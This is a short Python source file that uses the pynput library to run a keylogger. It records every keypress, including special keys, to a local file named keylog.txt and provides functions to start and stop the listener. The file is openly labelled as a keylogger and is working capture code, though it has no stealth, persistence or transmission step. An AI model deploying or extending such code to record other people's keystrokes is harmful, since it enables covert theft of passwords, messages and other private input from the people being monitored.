from pynput import keyboard
import time

listner_running = True

def on_press(key):
    try:
        with open('keylog.txt', 'a') as file:
            file.write(f"{key.char}\n")
    except AttributeError:
            with open('keylog.txt', 'a') as file:
                 file.write(f'{key}\n')

def on_release(status):
     global listner_running
     if not listner_running:
          return False
    
def start_keylogger():
    # with keyboard.Listener(on_press=on_press, on_release=on_release) as Listner:
    #     Listner.join()
    global listener, listner_running 
    listner_running = True
    listener = keyboard.Listener(on_press=on_press,on_release=on_release)
    listener.start()

def stop_keylogger():
     global listner_running, listener
     listner_running = False
     listener.stop()